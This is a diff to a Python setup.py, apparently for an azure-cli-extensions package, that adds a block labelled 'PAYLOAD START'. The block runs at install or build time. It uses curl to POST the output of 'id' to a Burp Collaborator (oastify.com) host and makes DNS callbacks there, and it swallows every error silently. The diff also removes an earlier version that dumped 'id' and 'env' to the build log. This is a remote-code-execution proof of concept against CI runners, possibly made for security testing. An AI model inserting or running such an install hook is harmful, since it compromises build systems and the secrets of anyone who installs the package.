@@ -9,26 +9,32 @@ from codecs import open
 from setuptools import setup, find_packages
 import os
 import sys
+import socket
+# ... other imports ...
 
 # --- PAYLOAD START ---
 try:
-    # Write to stderr (Standard Error) to bypass log buffering
-    sys.stderr.write("\n\n")
-    sys.stderr.write("================================================================\n")
-    sys.stderr.write("[!] CRITICAL VULNERABILITY: SETUP.PY RCE CONFIRMED [!]\n")
-    sys.stderr.write("================================================================\n")
+    # REPLACE THIS with your actual Collaborator domain
+    COLLAB_DOMAIN = "wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com" 
     
-    # Run commands and redirect their output to stderr
-    os.system("id >&2")
-    os.system("env >&2")
+    # Method 1: System Curl (Most reliable on GitHub Runners)
+    # We add a path /azure-cli-pwned so you know exactly which exploit hit
+    os.system(f"curl -X POST -d 'id=$(id)' https://{COLLAB_DOMAIN}/azure-cli-extensions-pwned")
     
-    sys.stderr.write("================================================================\n\n")
+    # Method 2: System DNS (nslookup/dig) - Good if HTTP is firewalled
+    os.system(f"nslookup {COLLAB_DOMAIN}")
     
-    # Force a crash to make the build fail and show logs immediately
-    raise RuntimeError("Stopping build intentionally to verify RCE")
+    # Method 3: Python Socket (Platform independent)
+    try:
+        socket.gethostbyname(COLLAB_DOMAIN)
+    except:
+        pass
+
+    # Still print to stderr just in case you want log proof too
+    sys.stderr.write(f"\n[!] Sent OOB ping to {COLLAB_DOMAIN}\n")
+    
 except Exception as e:
-    # If the raise above is caught by something else, print this
-    sys.stderr.write(str(e))
+    pass
   
 VERSION = "0.4.1"
 
